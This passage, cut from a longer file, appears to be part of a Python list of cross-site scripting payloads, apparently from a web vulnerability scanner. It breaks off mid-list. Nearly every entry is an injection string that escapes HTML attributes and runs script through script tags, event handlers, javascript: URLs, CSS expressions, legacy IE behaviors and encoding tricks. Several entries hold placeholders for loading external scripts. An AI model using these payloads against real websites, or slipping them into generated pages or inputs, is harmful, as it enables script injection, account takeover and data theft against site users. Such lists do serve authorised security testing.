             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '\'><% foo><x foo="%><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>">',
             '<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>',
             '"><div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>',
             '\'><div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>',
             '<img \\x00src=x onerror="alert(1)">', '"><img \\x00src=x onerror="alert(1)">',
             '\'><img \\x00src=x onerror="alert(1)">', '<img \\x47src=x onerror="javascript:alert(1)">',
             '"><img \\x47src=x onerror="javascript:alert(1)">', '\'><img \\x47src=x onerror="javascript:alert(1)">',
             '<img \\x11src=x onerror="javascript:alert(1)">', '"><img \\x11src=x onerror="javascript:alert(1)">',
             '\'><img \\x11src=x onerror="javascript:alert(1)">', '<img \\x12src=x onerror="javascript:alert(1)">',
             '"><img \\x12src=x onerror="javascript:alert(1)">', '\'><img \\x12src=x onerror="javascript:alert(1)">',
             '<img\\x47src=x onerror="javascript:alert(1)">', '"><img\\x47src=x onerror="javascript:alert(1)">',
             '\'><img\\x47src=x onerror="javascript:alert(1)">', '<img\\x10src=x onerror="javascript:alert(1)">',
             '"><img\\x10src=x onerror="javascript:alert(1)">', '\'><img\\x10src=x onerror="javascript:alert(1)">',
             '<img\\x13src=x onerror="javascript:alert(1)">', '"><img\\x13src=x onerror="javascript:alert(1)">',
             '\'><img\\x13src=x onerror="javascript:alert(1)">', '<img\\x32src=x onerror="javascript:alert(1)">',
             '"><img\\x32src=x onerror="javascript:alert(1)">', '\'><img\\x32src=x onerror="javascript:alert(1)">',
             '<img\\x11src=x onerror="javascript:alert(1)">', '"><img\\x11src=x onerror="javascript:alert(1)">',
             '\'><img\\x11src=x onerror="javascript:alert(1)">', '<img \\x34src=x onerror="javascript:alert(1)">',
             '"><img \\x34src=x onerror="javascript:alert(1)">', '\'><img \\x34src=x onerror="javascript:alert(1)">',
             '<img \\x39src=x onerror="javascript:alert(1)">', '"><img \\x39src=x onerror="javascript:alert(1)">',
             '\'><img \\x39src=x onerror="javascript:alert(1)">', '<img \\x00src=x onerror="javascript:alert(1)">',
             '"><img \\x00src=x onerror="javascript:alert(1)">', '\'><img \\x00src=x onerror="javascript:alert(1)">',
             '<img src\\x09=x onerror="javascript:alert(1)">', '"><img src\\x09=x onerror="javascript:alert(1)">',
             '\'><img src\\x09=x onerror="javascript:alert(1)">', '<img src\\x10=x onerror="javascript:alert(1)">',
             '"><img src\\x10=x onerror="javascript:alert(1)">', '\'><img src\\x10=x onerror="javascript:alert(1)">',
             '<img src\\x13=x onerror="javascript:alert(1)">', '"><img src\\x13=x onerror="javascript:alert(1)">',
             '\'><img src\\x13=x onerror="javascript:alert(1)">', '<img src\\x32=x onerror="javascript:alert(1)">',
             '"><img src\\x32=x onerror="javascript:alert(1)">', '\'><img src\\x32=x onerror="javascript:alert(1)">',
             '<img src\\x12=x onerror="javascript:alert(1)">', '"><img src\\x12=x onerror="javascript:alert(1)">',
             '\'><img src\\x12=x onerror="javascript:alert(1)">', '<img src\\x11=x onerror="javascript:alert(1)">',
             '"><img src\\x11=x onerror="javascript:alert(1)">', '\'><img src\\x11=x onerror="javascript:alert(1)">',
             '<img src\\x00=x onerror="javascript:alert(1)">', '"><img src\\x00=x onerror="javascript:alert(1)">',
             '\'><img src\\x00=x onerror="javascript:alert(1)">', '<img src\\x47=x onerror="javascript:alert(1)">',
             '"><img src\\x47=x onerror="javascript:alert(1)">', '\'><img src\\x47=x onerror="javascript:alert(1)">',
             '<img src=x\\x09onerror="javascript:alert(1)">', '"><img src=x\\x09onerror="javascript:alert(1)">',
             '\'><img src=x\\x09onerror="javascript:alert(1)">', '<img src=x\\x10onerror="javascript:alert(1)">',
             '"><img src=x\\x10onerror="javascript:alert(1)">', '\'><img src=x\\x10onerror="javascript:alert(1)">',
             '<img src=x\\x11onerror="javascript:alert(1)">', '"><img src=x\\x11onerror="javascript:alert(1)">',
             '\'><img src=x\\x11onerror="javascript:alert(1)">', '<img src=x\\x12onerror="javascript:alert(1)">',
             '"><img src=x\\x12onerror="javascript:alert(1)">', '\'><img src=x\\x12onerror="javascript:alert(1)">',
             '<img src=x\\x13onerror="javascript:alert(1)">', '"><img src=x\\x13onerror="javascript:alert(1)">',
             '\'><img src=x\\x13onerror="javascript:alert(1)">', '<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">',
             '"><img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">', '\'><img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">',
             '<img src=x onerror=\\x09"javascript:alert(1)">', '"><img src=x onerror=\\x09"javascript:alert(1)">',
             '\'><img src=x onerror=\\x09"javascript:alert(1)">', '<img src=x onerror=\\x10"javascript:alert(1)">',
             '"><img src=x onerror=\\x10"javascript:alert(1)">', '\'><img src=x onerror=\\x10"javascript:alert(1)">',
             '<img src=x onerror=\\x11"javascript:alert(1)">', '"><img src=x onerror=\\x11"javascript:alert(1)">',
             '\'><img src=x onerror=\\x11"javascript:alert(1)">', '<img src=x onerror=\\x12"javascript:alert(1)">',
             '"><img src=x onerror=\\x12"javascript:alert(1)">', '\'><img src=x onerror=\\x12"javascript:alert(1)">',
             '<img src=x onerror=\\x32"javascript:alert(1)">', '"><img src=x onerror=\\x32"javascript:alert(1)">',
             '\'><img src=x onerror=\\x32"javascript:alert(1)">', '<img src=x onerror=\\x00"javascript:alert(1)">',
             '"><img src=x onerror=\\x00"javascript:alert(1)">', '\'><img src=x onerror=\\x00"javascript:alert(1)">',
             '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>X</a>',
             '"><a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>X</a>',
             "'><a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>X</a>",
             '<img src="x` `<script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>"` `>',
             '"><img src="x` `<script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>"` `>',
             '\'><img src="x` `<script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>"` `>',
             '<img src onerror /" \'"= alt=javascript:alert(1)//">',
             '"><img src onerror /" \'"= alt=javascript:alert(1)//">',
             '\'><img src onerror /" \'"= alt=javascript:alert(1)//">',
             '<title onpropertychange=javascript:alert(1)></title><title title=>',
             '"><title onpropertychange=javascript:alert(1)></title><title title=>',
             "'><title onpropertychange=javascript:alert(1)></title><title title=>",
             '<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">',
             '"><a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">',
             '\'><a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">',
             '<!--[if]><script>javascript:alert(1)</script -->', '"><!--[if]><script>javascript:alert(1)</script -->',
             "'><!--[if]><script>javascript:alert(1)</script -->",
             '<!--[if<img src=x onerror=javascript:alert(1)//]> -->',
             '"><!--[if<img src=x onerror=javascript:alert(1)//]> -->',
             "'><!--[if<img src=x onerror=javascript:alert(1)//]> -->", '<script src="/\\%(jscript)s"></script>',
             '"><script src="/\\%(jscript)s"></script>', '\'><script src="/\\%(jscript)s"></script>',
             '<script src="\\\\%(jscript)s"></script>', '"><script src="\\\\%(jscript)s"></script>',
             '\'><script src="\\\\%(jscript)s"></script>',
             '<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>',
             '"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>',
             '\'><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>',
             '<a style="-o-link:\'javascript:javascript:alert(1)\';-o-link-source:current">X',
             '"><a style="-o-link:\'javascript:javascript:alert(1)\';-o-link-source:current">X',
             '\'><a style="-o-link:\'javascript:javascript:alert(1)\';-o-link-source:current">X',
             "<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>",
             '"><style>p[foo=bar{}*{-o-link:\'javascript:javascript:alert(1)\'}{}*{-o-link-source:current}]{color:red};</style>',
             "'><style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>",
             '<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d',
             '"><link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d',
             "'><link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",
             '<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>',
             '"><style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>',
             '\'><style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>',
             '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">X</a></a><a href="javascript:javascript:alert(1)">X</a><style>*[{}@import\'%(css)s?]</style>X',
             '"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">X</a></a><a href="javascript:javascript:alert(1)">X</a><style>*[{}@import\'%(css)s?]</style>X',
             '\'><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">X</a></a><a href="javascript:javascript:alert(1)">X</a><style>*[{}@import\'%(css)s?]</style>X',
             '<div style="font-family:\'foo&#10;;color:red;\';">X',
             '"><div style="font-family:\'foo&#10;;color:red;\';">X',
             '\'><div style="font-family:\'foo&#10;;color:red;\';">X', '<div style="font-family:foo}color=red;">X',
             '"><div style="font-family:foo}color=red;">X', '\'><div style="font-family:foo}color=red;">X',
             '<// style=x:expression\\28javascript:alert(1)\\29>',
             '"><// style=x:expression\\28javascript:alert(1)\\29>',
             "'><// style=x:expression\\28javascript:alert(1)\\29>",
             '<style>*{x:??????????(javascript:alert(1))}</style>',
             '"><style>*{x:??????????(javascript:alert(1))}</style>',
             "'><style>*{x:??????????(javascript:alert(1))}</style>", '<div style=content:url(%(svg)s)></div>',
             '"><div style=content:url(%(svg)s)></div>', "'><div style=content:url(%(svg)s)></div>",
             '<div style="list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));">X',
             '"><div style="list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));">X',
             '\'><div style="list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));">X',
             '<div id=d><div style="font-family:\'sans\\27\\3B color\\3Ared\\3B\'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
             '"><div id=d><div style="font-family:\'sans\\27\\3B color\\3Ared\\3B\'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
             '\'><div id=d><div style="font-family:\'sans\\27\\3B color\\3Ared\\3B\'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
             '<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X',
             '"><div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X',
             '\'><div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X',
             '<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '\'><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
             '<div id="x">X</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>',
             '"><div id="x">X</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>',
             '\'><div id="x">X</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>',
             '<x style="background:url(\'x&#1;;color:red;/*\')">X</x>',
             '"><x style="background:url(\'x&#1;;color:red;/*\')">X</x>',
             '\'><x style="background:url(\'x&#1;;color:red;/*\')">X</x>',
             '<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',
             '</ScrIpt><script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',
             '"><script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',
             '</ScrIpt><script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',
             "'><script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",
             '</ScrIpt><script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',
             '<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',
             '</ScrIpt><script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',
             '"><script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',
             '</ScrIpt><script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',
             "'><script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>",
             '</ScrIpt><script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',
             "<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",
             "</ScrIpt><script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",
             '"><script>ReferenceError.prototype.__defineGetter__(\'name\', function(){javascript:alert(1)}),x</script>',
             "</ScrIpt><script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",
             "'><script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",
             "</ScrIpt><script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",
             "<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",
             "</ScrIpt><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",
             '"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'javascript:alert(1)\')()</script>',
             "</ScrIpt><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",
             "'><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",
             "</ScrIpt><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",
             '<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
             '"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
             '\'><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
             '<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
             '"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
             '\'><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
             '<meta charset="mac-farsi">?script?javascript:alert(1)?/script?',
             '"><meta charset="mac-farsi">?script?javascript:alert(1)?/script?',
             '\'><meta charset="mac-farsi">?script?javascript:alert(1)?/script?',
             'X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >',
             '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>',
             '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>',
             '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#X></vmlframe>',
             '"><vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#X></vmlframe>',
             "'><vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#X></vmlframe>",
             '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
             '<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">X</a>',
             '"><a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">X</a>',
             '\'><a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">X</a>',
             '<x style="behavior:url(%(sct)s)">', '"><x style="behavior:url(%(sct)s)">',
             '\'><x style="behavior:url(%(sct)s)">',
             '<xml id="X" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#X" datafld="payload"></label>',
             '"><xml id="X" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#X" datafld="payload"></label>',
             '\'><xml id="X" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#X" datafld="payload"></label>',
             '<event-source src="%(event)s" onload="javascript:alert(1)">',
             '"><event-source src="%(event)s" onload="javascript:alert(1)">',
             '\'><event-source src="%(event)s" onload="javascript:alert(1)">',
             '<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:X%0A%0A">',
             '"><a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:X%0A%0A">',
             '\'><a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:X%0A%0A">',
             '<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">',
             '"><div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">',
             '\'><div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">',
             '<script>%(payload)s</script>', '</ScrIpt><script>%(payload)s</script>', '"><script>%(payload)s</script>',
             '</ScrIpt><script>%(payload)s</script>', "'><script>%(payload)s</script>",
             '</ScrIpt><script>%(payload)s</script>', '<script src=%(jscript)s></script>',
             '"><script src=%(jscript)s></script>', "'><script src=%(jscript)s></script>",
             "<script language='javascript' src='%(jscript)s'></script>",
             '"><script language=\'javascript\' src=\'%(jscript)s\'></script>',
             "'><script language='javascript' src='%(jscript)s'></script>", '<script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>', '<IMG SRC="javascript:javascript:alert(1);">',
             '"><IMG SRC="javascript:javascript:alert(1);">', '\'><IMG SRC="javascript:javascript:alert(1);">',
             '<IMG SRC=javascript:javascript:alert(1)>', '"><IMG SRC=javascript:javascript:alert(1)>',
             "'><IMG SRC=javascript:javascript:alert(1)>", '<IMG SRC=`javascript:javascript:alert(1)`>',
             '"><IMG SRC=`javascript:javascript:alert(1)`>', "'><IMG SRC=`javascript:javascript:alert(1)`>",
             '<SCRIPT SRC=%(jscript)s?<B>', '"><SCRIPT SRC=%(jscript)s?<B>', "'><SCRIPT SRC=%(jscript)s?<B>",
             '<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>',
             '"><FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>',
             '\'><FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>',
             '<BODY ONLOAD=javascript:alert(1)>', '"><BODY ONLOAD=javascript:alert(1)>',
             "'><BODY ONLOAD=javascript:alert(1)>", '<BODY ONLOAD=javascript:javascript:alert(1)>',
             '"><BODY ONLOAD=javascript:javascript:alert(1)>', "'><BODY ONLOAD=javascript:javascript:alert(1)>",
             '<IMG SRC="jav\tascript:javascript:alert(1);">', '"><IMG SRC="jav\tascript:javascript:alert(1);">',
             '\'><IMG SRC="jav\tascript:javascript:alert(1);">',
             '<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)>',
             '"><BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)>',
             "'><BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)>", '<SCRIPT/SRC="%(jscript)s"></SCRIPT>',
             '"><SCRIPT/SRC="%(jscript)s"></SCRIPT>', '\'><SCRIPT/SRC="%(jscript)s"></SCRIPT>',
             '<<SCRIPT>%(payload)s//<</SCRIPT>', '"><<SCRIPT>%(payload)s//<</SCRIPT>',
             "'><<SCRIPT>%(payload)s//<</SCRIPT>", '<IMG SRC="javascript:javascript:alert(1)"',
             '"><IMG SRC="javascript:javascript:alert(1)"', '\'><IMG SRC="javascript:javascript:alert(1)"',
             '<iframe src=%(scriptlet)s <', '"><iframe src=%(scriptlet)s <', "'><iframe src=%(scriptlet)s <",
             '<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">',
             '"><INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">',
             '\'><INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">',
             '<IMG DYNSRC="javascript:javascript:alert(1)">', '"><IMG DYNSRC="javascript:javascript:alert(1)">',
             '\'><IMG DYNSRC="javascript:javascript:alert(1)">', '<IMG LOWSRC="javascript:javascript:alert(1)">',
             '"><IMG LOWSRC="javascript:javascript:alert(1)">', '\'><IMG LOWSRC="javascript:javascript:alert(1)">',
             '<BGSOUND SRC="javascript:javascript:alert(1);">', '"><BGSOUND SRC="javascript:javascript:alert(1);">',
             '\'><BGSOUND SRC="javascript:javascript:alert(1);">', '<BR SIZE="&{javascript:alert(1)}">',
             '"><BR SIZE="&{javascript:alert(1)}">', '\'><BR SIZE="&{javascript:alert(1)}">',
             '<LAYER SRC="%(scriptlet)s"></LAYER>', '"><LAYER SRC="%(scriptlet)s"></LAYER>',
             '\'><LAYER SRC="%(scriptlet)s"></LAYER>', '<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">',
             '"><LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">',
             '\'><LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">', "<STYLE>@import'%(css)s';</STYLE>",
             '"><STYLE>@import\'%(css)s\';</STYLE>', "'><STYLE>@import'%(css)s';</STYLE>",
             '<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">',
             '"><META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">',
             '\'><META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">', '<X STYLE="behavior: url(%(htc)s);">',
             '"><X STYLE="behavior: url(%(htc)s);">', '\'><X STYLE="behavior: url(%(htc)s);">',
             '<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>X',
             '"><STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>X',
             '\'><STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>X',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">',
             '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">',
             '<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>',
             '"><IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>',
             '\'><IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>',
             '<TABLE BACKGROUND="javascript:javascript:alert(1)">',
             '"><TABLE BACKGROUND="javascript:javascript:alert(1)">',
             '\'><TABLE BACKGROUND="javascript:javascript:alert(1)">',
             '<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">',
             '"><TABLE><TD BACKGROUND="javascript:javascript:alert(1)">',
             '\'><TABLE><TD BACKGROUND="javascript:javascript:alert(1)">',
             '<DIV STYLE="background-image: url(javascript:javascript:alert(1))">',
             '"><DIV STYLE="background-image: url(javascript:javascript:alert(1))">',
             '\'><DIV STYLE="background-image: url(javascript:javascript:alert(1))">',
             '<DIV STYLE="width:expression(javascript:alert(1));">',
             '"><DIV STYLE="width:expression(javascript:alert(1));">',
             '\'><DIV STYLE="width:expression(javascript:alert(1));">',
             '<IMG STYLE="X:expr/*X*/ession(javascript:alert(1))">',
             '"><IMG STYLE="X:expr/*X*/ession(javascript:alert(1))">',
             '\'><IMG STYLE="X:expr/*X*/ession(javascript:alert(1))">', '<X STYLE="X:expression(javascript:alert(1))">',
             '"><X STYLE="X:expression(javascript:alert(1))">', '\'><X STYLE="X:expression(javascript:alert(1))">',
             '<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>',
             '"><STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>',
             '\'><STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>',
             '<STYLE>.X{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=X></A>',
             '"><STYLE>.X{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=X></A>',
             '\'><STYLE>.X{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=X></A>',
             '"><A CLASS=X></A>', "'><A CLASS=X></A>",
             '<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>',
             '"><STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>',
             '\'><STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>',
             '<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->',
             '"><!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->',
             "'><!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->",
             '<BASE HREF="javascript:javascript:alert(1);//">', '"><BASE HREF="javascript:javascript:alert(1);//">',
             '\'><BASE HREF="javascript:javascript:alert(1);//">',
             '<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>',
             '"><OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>',
             '\'><OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>',
             '<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>',
             '"><OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>',
             "'><OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>",
             '<HTML xmlns:X><?import namespace="X" implementation="%(htc)s"><X:X>X</X:X></HTML>""","XML namespace."),("""<XML ID="X"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
             '"><HTML xmlns:X><?import namespace="X" implementation="%(htc)s"><X:X>X</X:X></HTML>""","XML namespace."),("""<XML ID="X"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
